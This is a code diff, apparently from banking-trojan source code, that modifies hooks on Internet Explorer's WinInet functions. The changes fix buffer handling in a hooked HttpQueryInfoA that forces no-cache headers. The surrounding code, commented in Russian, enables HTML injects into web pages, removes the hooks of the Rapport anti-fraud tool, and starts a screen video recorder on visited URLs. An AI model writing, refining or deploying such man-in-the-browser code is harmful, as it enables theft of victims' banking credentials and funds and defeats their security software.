@@ -1172,6 +1172,7 @@ BOOL WINAPI HOOK_HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel,
 	LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex)
 
 {
+	DWORD Max = *lpdwBufferLength;
 
 	BOOL Result =  REAL_HttpQueryInfoA(hRequest, dwInfoLevel,
 		lpBuffer, lpdwBufferLength, lpdwIndex);
@@ -1184,8 +1185,11 @@ BOOL WINAPI HOOK_HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel,
 	{
 
 		PCHAR Buf = (PCHAR)lpBuffer;
+		DWORD Cur = *lpdwBufferLength;
+		if (Cur < Max)
+        	*(Buf + Cur) = 0;
 
-		HTTPParser::SetHeaderValue(Buf, 0, 0, ParamCacheControl, "no-store, no-cache, must-revalidate", lpdwBufferLength);
+		HTTPParser::SetHeaderValue(Buf, Cur, Max, ParamCacheControl, ValueNoCacheDocument, lpdwBufferLength);
 	}
 
     return Result;
@@ -1401,7 +1405,7 @@ bool HookInternetExplorer() {
 
 #ifdef HTMLInjectsH
 	IEDBG("Инициализируем HTML инжекты");
-	Config::Initialize(NULL, true, false);
+	Config::Initialize(NULL, true, false); 
 #endif
 
 	if (!HookInternetExplorerApi())
@@ -1429,9 +1433,9 @@ bool HookInternetExplorerApi() {
 
 	IEDBG("Перехват функций WinAPI");
 
-#ifdef antirapportH
-	AntiRapport(); // снимаем хуки антирапорта
-#endif
+	#ifdef antirapportH
+		AntiRapport(); // снимаем хуки антирапорта
+	#endif
 
 	UnhookIE();
 
@@ -1565,8 +1569,6 @@ bool HookInternetExplorerApi() {
 		IEDBG("Запускаем видео рекордер");
 		StartVideoFromCurrentURL();
 	#endif
-
-	//IECache::Initialize(Requests);
 
 	IEDBG("Функции WinInet успешно перехвачены");
 
